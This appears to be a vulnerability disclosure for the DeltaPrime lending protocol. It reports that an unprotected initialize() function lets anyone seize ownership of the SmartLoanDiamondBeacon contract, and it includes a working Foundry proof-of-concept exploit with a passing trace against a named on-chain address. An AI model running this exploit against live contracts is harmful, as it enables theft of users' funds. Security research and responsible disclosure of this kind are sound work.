I found the potential bug that could lead to contract hijacking in DeltaPrime protocol 


Target
https://github.com/DeltaPrimeLabs/deltaprime-primeloans

Vulnerability Details
DeltaPrime maintains all users’ prime accounts in the pattern of “Proxy+implementation” where each prime account is a proxy pointing to the implementation contract. The implementation contract, i.e., “SmartLoanDiamondBeacon”, adheres to the EIP-2535 standard (Diamond) and can only be managed by the protocol owner. This means that if a malicious user can manage to become the owner of the "SmartLoanDiamondBeacon" contract, he/she can gain control over all users' Prime accounts.

When i reviewed the DeltaPrime code implementation, i did indeed discover such a vulnerability. Specifically, this vulnerability involves a facet contract called “SmartLoanViewFacet”. This contract includes an “initialize()” function, originally designed to initialize the owner for a new prime account. However, we noticed that a hacker can directly call the “SmartLoanViewFacet::initialize()” function to hijack the owner of the “SmartLoanDiamondBeacon” contract.

With ownership of the “SmartLoanDiamondBeacon” contract, the hacker can arbitrarily modify the functionalities of the implementation for all prime accounts, enabling the hacker to steal all the protocol funds, including the funds in all DeltaPrime lending pools and all Prime Accounts. The estimated total loss is >$50M. For example, the hacker can add a “freeBorrow()” function to borrow all the lending pool funds without any solvency check.

Furthermore, once the owner of the “SmartLoanDiamondBeacon” contract is hijacked, there is no way for DeltaPrime to take it back or mitigate the exploit, which means the protocol is totally controlled by the hacker.

Validation steps
Vulnerability Code:

https://github.com/DeltaPrimeLabs/deltaprime-primeloans/blob/dev/main/contracts/facets/SmartLoanViewFacet.sol#L42


Proof of concept (POC):

![Image](https://github.com/user-attachments/assets/7d82a4e7-7f5e-4010-857f-e7add392f858)


// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "forge-std/Test.sol";

interface ISmartLoanDiamondBeacon {
    function initialize(address owner) external;
}

contract POC is Test {
    string constant endpoint = "RPC_URL";
    address constant diamond = 0x62Cf82FB0484aF382714cD09296260edc1DC0c6c;
    address constant newOwner = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;// Note: it can be anyone.
		
    function setUp() public {
        vm.createSelectFork(endpoint, 234980496);
    }
    function test_hijackSmartLoanDiamondBeaconOwner() public {
        ISmartLoanDiamondBeacon(diamond).initialize(newOwner);
    }
}




Result after ran test on foundry:

Running 1 test for test/POC.t.sol:POC
[PASS] test_hijackSmartLoanDiamondBeaconOwner() (gas: 39748)
Traces:
  [39748] POC::test_hijackSmartLoanDiamondBeaconOwner()
    ├─ [36709] 0x62Cf82FB0484aF382714cD09296260edc1DC0c6c::initialize(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4)
    │   ├─ [29309] 0xD9EB3D537517040B339e6bea8dfA8EDe7f364512::initialize(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4) [delegatecall]
    │   │   ├─ emit OwnershipTransferred(param0: 0x43D9A211BDdC5a925fA2b19910D44C51D5c9aa93, param1: 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4)
    │   │   └─ ← ()
    │   └─ ← ()
    └─ ← ()
Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.28s

![Image](https://github.com/user-attachments/assets/81e34efc-fec6-4856-a7a7-a7e811c3effd)

